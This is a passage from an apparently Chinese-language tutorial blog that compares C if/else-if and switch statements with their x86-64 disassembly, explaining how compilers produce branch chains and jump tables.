class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span>   <span class="hljs-comment">//</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h  <span class="hljs-comment">//argc</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h  <span class="hljs-comment">//argv</span><br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">5</span>   <span class="hljs-comment">//var_a=5</span><br>.text:<span class="hljs-number">000000000040156B</span>                 lea     rax, [rbp+var_4]  <br>.text:<span class="hljs-number">000000000040156F</span>                 mov     rdx, rax<br>.text:<span class="hljs-number">0000000000401572</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">0000000000401579</span>                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">000000000040157</span>E                 cmp     [rbp+arg_0], <span class="hljs-number">0</span>  <span class="hljs-comment">//argc -0  //if (var_a==0)&#123; pintf(&quot;argc == 0\r&quot;);&#125;</span><br>.text:<span class="hljs-number">0000000000401582</span>                 jnz     <span class="hljs-keyword">short</span> loc_401592<br>.text:<span class="hljs-number">0000000000401584</span>                 lea     rcx, Buffer     ; <span class="hljs-string">&quot;argc == 0\r&quot;</span><br>.text:<span class="hljs-number">000000000040158B</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401590</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015DA  <span class="hljs-comment">//直接结束</span><br>.text:<span class="hljs-number">0000000000401592</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401592</span>  <span class="hljs-comment">//这里可以看到是直接无条件跳转到这里 结束指向同一个 地址loc_4015DA 由于loc_4015BE后才是统一结束判断地址 因为 那里是对应的else语句 因此可以判断使用了 ifelif语句结构</span><br>.text:<span class="hljs-number">0000000000401592</span> loc_401592:                             ; CODE XREF: main+<span class="hljs-number">32</span>↑j  <span class="hljs-comment">//if</span><br>.text:<span class="hljs-number">0000000000401592</span>                 cmp     [rbp+arg_0], <span class="hljs-number">1</span>  <span class="hljs-comment">//elif (var_a==1)&#123; pintf(&quot;argc == 1\r&quot;);&#125;</span><br>.text:<span class="hljs-number">0000000000401596</span>                 jnz     <span class="hljs-keyword">short</span> h<br>.text:<span class="hljs-number">0000000000401598</span>                 lea     rcx, aArgc1     ; <span class="hljs-string">&quot;argc == 1\r&quot;</span><br>.text:<span class="hljs-number">000000000040159F</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>A4                 jmp     <span class="hljs-keyword">short</span> loc_4015DA<br>.text:<span class="hljs-number">00000000004015</span>A6 ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>A6<br>.text:<span class="hljs-number">00000000004015</span>A6 loc_4015A6:                             ; CODE XREF: main+<span class="hljs-number">46</span>↑j <span class="hljs-comment">//elif (var_a==2)&#123; pintf(&quot;argc == 2\r&quot;);&#125;</span><br>.text:<span class="hljs-number">00000000004015</span>A6                 cmp     [rbp+arg_0], <span class="hljs-number">2</span><br>.text:<span class="hljs-number">00000000004015</span>AA                 jnz     <span class="hljs-keyword">short</span> loc_4015BA<br>.text:<span class="hljs-number">00000000004015</span>AC                 lea     rcx, aArgc2     ; <span class="hljs-string">&quot;argc == 2\r&quot;</span><br>.text:<span class="hljs-number">00000000004015B</span>3                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015B</span>8                 jmp     <span class="hljs-keyword">short</span> loc_4015DA<br>.text:<span class="hljs-number">00000000004015B</span>A ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015B</span>A<br>.text:<span class="hljs-number">00000000004015B</span>A loc_4015BA:                             ; CODE XREF: main+<span class="hljs-number">5</span>A↑j <span class="hljs-comment">//elif (var_a==3)&#123; pintf(&quot;argc == 3\r&quot;);&#125;</span><br>.text:<span class="hljs-number">00000000004015B</span>A                 cmp     [rbp+arg_0], <span class="hljs-number">3</span><br>.text:<span class="hljs-number">00000000004015B</span>E                 jnz     <span class="hljs-keyword">short</span> loc_4015CE<br>.text:<span class="hljs-number">00000000004015</span>C0                 lea     rcx, aArgc3     ; <span class="hljs-string">&quot;argc == 3\r&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>C7                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>CC                 jmp     <span class="hljs-keyword">short</span> loc_4015DA<br>.text:<span class="hljs-number">00000000004015</span>CE ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>CE<br>.text:<span class="hljs-number">00000000004015</span>CE loc_4015CE:                             ; CODE XREF: main+<span class="hljs-number">6</span>E↑j<br>.text:<span class="hljs-number">00000000004015</span>CE                 lea     rcx, aElse      ; <span class="hljs-string">&quot;else\r&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>D5                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>DA<br>.text:<span class="hljs-number">00000000004015</span>DA loc_4015DA:                             ; CODE XREF: main+<span class="hljs-number">40</span>↑j<br>.text:<span class="hljs-number">00000000004015</span>DA                                         ; main+<span class="hljs-number">54</span>↑j ...<br>.text:<span class="hljs-number">00000000004015</span>DA                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">00000000004015E1</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015E6</span>                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>ED                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015F</span>2                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">00000000004015F</span>9                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015F</span>E                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">0000000000401605</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">000000000040160</span>A                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">0000000000401611</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401616</span>                 mov     eax, [rbp+var_4]<br>.text:<span class="hljs-number">0000000000401619</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">000000000040161</span>D                 pop     rbp<br>.text:<span class="hljs-number">000000000040161</span>E                 retn<br>.text:<span class="hljs-number">000000000040161</span>E main            endp<br></code></pre></td></tr></table></figure><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p>特点：</p><p>​    特点1: // 注意，和elseif不同，内容中没有break的话，编译不会自动加入break（就是jmp 结尾） </p><p>​    特点2: // 内容连着写，这是为了符合C语言的语法：case中不写break，会顺着执行下一条case</p><p>​    特点3:// 跳转表是从0开始的，因此记录最小值，switch的判断中会让元素减去最小值，再查表。减去最小值的好处：如果输入小于最小值，那么这个输入再减去最小值就会变成负数， 而比较时使用ja，也就是用无符号数判断，那么这个负数就会变成一个很大的数，同样会跳转</p><h4 id="ezswitch小于3"><a href="#ezswitch小于3" class="headerlink" title="ezswitch小于3"></a>ezswitch小于3</h4><p>switch</p><p>当case情况小于等于3时，ifelse和switch并没有什么区别</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span>(argc)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;case 0\n&quot;</span>);<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;case 1\n&quot;</span>);<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;case 2\n&quot;</span>);<br><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;HelloWorld\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应反汇编</p><p>//下面这里编辑器做了优化 减少了一次跳转 0 1 2  =&gt; 1 2 0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">20</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 cmp     [rbp+arg_0], <span class="hljs-number">1</span><br>.text:<span class="hljs-number">0000000000401568</span>                 jz      <span class="hljs-keyword">short</span> loc_401584<br>.text:<span class="hljs-number">000000000040156</span>A                 cmp     [rbp+arg_0], <span class="hljs-number">2</span><br>.text:<span class="hljs-number">000000000040156</span>E                 jz      <span class="hljs-keyword">short</span> loc_401592<br>.text:<span class="hljs-number">0000000000401570</span>                 cmp     [rbp+arg_0], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401574</span>                 jnz     <span class="hljs-keyword">short</span> loc_40159F<br>.text:<span class="hljs-number">0000000000401576</span>                 lea     rcx, Buffer     ; <span class="hljs-string">&quot;case 0&quot;</span><br>.text:<span class="hljs-number">000000000040157</span>D                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401582</span>                 jmp     <span class="hljs-keyword">short</span> loc_40159F<br>.text:<span class="hljs-number">0000000000401584</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401584</span><br>.text:<span class="hljs-number">0000000000401584</span> loc_401584:                             ; CODE XREF: main+<span class="hljs-number">18</span>↑j<br>.text:<span class="hljs-number">0000000000401584</span>                 lea     rcx, aCase1     ; <span class="hljs-string">&quot;case 1&quot;</span><br>.text:<span class="hljs-number">000000000040158B</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401590</span>                 jmp     <span class="hljs-keyword">short</span> loc_40159F<br>.text:<span class="hljs-number">0000000000401592</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401592</span><br>.text:<span class="hljs-number">0000000000401592</span> loc_401592:                             ; CODE XREF: main+<span class="hljs-number">1</span>E↑j<br>.text:<span class="hljs-number">0000000000401592</span>                 lea     rcx, aCase2     ; <span class="hljs-string">&quot;case 2&quot;</span><br>.text:<span class="hljs-number">0000000000401599</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">000000000040159</span>E                 nop<br>.text:<span class="hljs-number">000000000040159F</span><br>.text:<span class="hljs-number">000000000040159F</span> loc_40159F:                             ; CODE XREF: main+<span class="hljs-number">24</span>↑j<br>.text:<span class="hljs-number">000000000040159F</span>                                         ; main+<span class="hljs-number">32</span>↑j ...<br>.text:<span class="hljs-number">000000000040159F</span>                 lea     rcx, aHelloworld ; <span class="hljs-string">&quot;HelloWorld&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>A6                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>AB                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">00000000004015B</span>0                 add     rsp, <span class="hljs-number">20</span>h<br>.text:<span class="hljs-number">00000000004015B</span>4                 pop     rbp<br>.text:<span class="hljs-number">00000000004015B</span>5                 retn<br>.text:<span class="hljs-number">00000000004015B</span>5 main            endp<br></code></pre></td></tr></table></figure><h4 id="switch-分支大于4"><a href="#switch-分支大于4" class="headerlink" title="switch 分支大于4"></a>switch 分支大于4</h4><p>注意switch分支大于4之后就有跳转表</p><p>详解在switch7那里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myFunction</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span>(x)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    myFunction(<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的反汇编代码  (这里仅放function的部分)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"> myFunction      proc near               ; CODE XREF: main+<span class="hljs-number">12</span>↓p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h   <span class="hljs-comment">//传入参数</span><br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp  <br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">20</span>h                 <span class="hljs-comment">//开辟空间 </span><br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx  <span class="hljs-comment">//把 传入的参数 给 函数体内的局部变量 </span><br>.text:<span class="hljs-number">000000000040155B</span>                 cmp     [rbp+arg_0], <span class="hljs-number">2</span>   <span class="hljs-comment">// if(x==2)</span><br>.text:<span class="hljs-number">000000000040155F</span>                 jz      <span class="hljs-keyword">short</span> loc_401589<br>.text:<span class="hljs-number">0000000000401561</span>                 cmp     [rbp+arg_0], <span class="hljs-number">2</span>  <span class="hljs-comment">//if(x&gt;2)</span><br>.text:<span class="hljs-number">0000000000401565</span>                 jg      <span class="hljs-keyword">short</span> loc_40156F<br>.text:<span class="hljs-number">0000000000401567</span>                 cmp     [rbp+arg_0], <span class="hljs-number">1</span> <span class="hljs-comment">//if(x==1)</span><br>.text:<span class="hljs-number">000000000040156B</span>                 jz      <span class="hljs-keyword">short</span> loc_40157D  <br>.text:<span class="hljs-number">000000000040156</span>D                 jmp     <span class="hljs-keyword">short</span> loc_4015AD<br>.text:<span class="hljs-number">000000000040156F</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000040156F</span><br>.text:<span class="hljs-number">000000000040156F</span> loc_40156F:                             ; CODE XREF: myFunction+<span class="hljs-number">15</span>↑j<br>.text:<span class="hljs-number">000000000040156F</span>                 cmp     [rbp+arg_0], <span class="hljs-number">3</span>   <br>.text:<span class="hljs-number">0000000000401573</span>                 jz      <span class="hljs-keyword">short</span> loc_401595<br>.text:<span class="hljs-number">0000000000401575</span>                 cmp     [rbp+arg_0], <span class="hljs-number">4</span><br>.text:<span class="hljs-number">0000000000401579</span>                 jz      <span class="hljs-keyword">short</span> loc_4015A1<br>.text:<span class="hljs-number">000000000040157B</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015AD<br>.text:<span class="hljs-number">000000000040157</span>D ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000040157</span>D<br>.text:<span class="hljs-number">000000000040157</span>D loc_40157D:                             ; CODE XREF: myFunction+<span class="hljs-number">1B</span>↑j<br>.text:<span class="hljs-number">000000000040157</span>D                 mov     ecx, <span class="hljs-number">31</span>h ; <span class="hljs-string">&#x27;1&#x27;</span>  ; Character<br>.text:<span class="hljs-number">0000000000401582</span>                 call    <span class="hljs-built_in">putchar</span>   <span class="hljs-comment">//printf(&quot;1&quot;);</span><br>.text:<span class="hljs-number">0000000000401587</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">0000000000401589</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401589</span><br>.text:<span class="hljs-number">0000000000401589</span> loc_401589:                             ; CODE XREF: myFunction+F↑j<br>.text:<span class="hljs-number">0000000000401589</span>                 mov     ecx, <span class="hljs-number">32</span>h ; <span class="hljs-string">&#x27;2&#x27;</span>  ; Character<br>.text:<span class="hljs-number">000000000040158</span>E                 call    <span class="hljs-built_in">putchar</span>   <span class="hljs-comment">// printf(&quot;2&quot;);</span><br>.text:<span class="hljs-number">0000000000401593</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">0000000000401595</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401595</span><br>.text:<span class="hljs-number">0000000000401595</span> loc_401595:                             ; CODE XREF: myFunction+<span class="hljs-number">23</span>↑j<br>.text:<span class="hljs-number">0000000000401595</span>                 mov     ecx, <span class="hljs-number">33</span>h ; <span class="hljs-string">&#x27;3&#x27;</span>  ; Character<br>.text:<span class="hljs-number">000000000040159</span>A                 call    <span class="hljs-built_in">putchar</span>  <span class="hljs-comment">//printf(&quot;3&quot;);</span><br>.text:<span class="hljs-number">000000000040159F</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">00000000004015</span>A1 ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>A1<br>.text:<span class="hljs-number">00000000004015</span>A1 loc_4015A1:                             ; CODE XREF: myFunction+<span class="hljs-number">29</span>↑j<br>.text:<span class="hljs-number">00000000004015</span>A1                 mov     ecx, <span class="hljs-number">34</span>h ; <span class="hljs-string">&#x27;4&#x27;</span>  ; Character<br>.text:<span class="hljs-number">00000000004015</span>A6                 call    <span class="hljs-built_in">putchar</span>  <span class="hljs-comment">//printf(&quot;4&quot;);</span><br>.text:<span class="hljs-number">00000000004015</span>AB                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">00000000004015</span>AD ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>AD<br>.text:<span class="hljs-number">00000000004015</span>AD loc_4015AD:                             ; CODE XREF: myFunction+<span class="hljs-number">1</span>D↑j<br>.text:<span class="hljs-number">00000000004015</span>AD                                         ; myFunction+<span class="hljs-number">2B</span>↑j<br>.text:<span class="hljs-number">00000000004015</span>AD                 lea     rcx, Format     ; <span class="hljs-string">&quot;error&quot;</span>  <span class="hljs-comment">//default:error</span><br>.text:<span class="hljs-number">00000000004015B</span>4                 call    <span class="hljs-built_in">printf</span><br>.text:<span class="hljs-number">00000000004015B</span>9<br>.text:<span class="hljs-number">00000000004015B</span>9 loc_4015B9:                             ; CODE XREF: myFunction+<span class="hljs-number">37</span>↑j<br>.text:<span class="hljs-number">00000000004015B</span>9                                         ; myFunction+<span class="hljs-number">43</span>↑j ...<br>.text:<span class="hljs-number">00000000004015B</span>9                 nop<br>.text:<span class="hljs-number">00000000004015B</span>A                 add     rsp, <span class="hljs-number">20</span>h<br>.text:<span class="hljs-number">00000000004015B</span>E                 pop     rbp<br>.text:<span class="hljs-number">00000000004015B</span>F                 retn<br>.text:<span class="hljs-number">00000000004015B</span>F myFunction      endp<br></code></pre></td></tr></table></figure><h4 id="switch-分支大于7"><a href="#switch-分支大于7" class="headerlink" title="switch 分支大于7"></a>switch 分支大于7</h4><p>当switch的分支大于7时</p><p>这是小表存放跳转的索引 即 edx</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202112261422135.png" alt="image-20211226142233001"></p><p>内存会建立跳转表 存放 每个case后的函数体的起始地址</p><p>这里的寻址类似于数组的寻址  address=[第一个case的起始地址+4*寄存器(步长)]</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202112261718094.png" alt="image-20211226171819013"></p><p>如图，展示了大表存储跳转表的地址</p><p>可知     jmp [寄存器*4 + 0xxxxx] ;跳转表模式的重要特征</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span 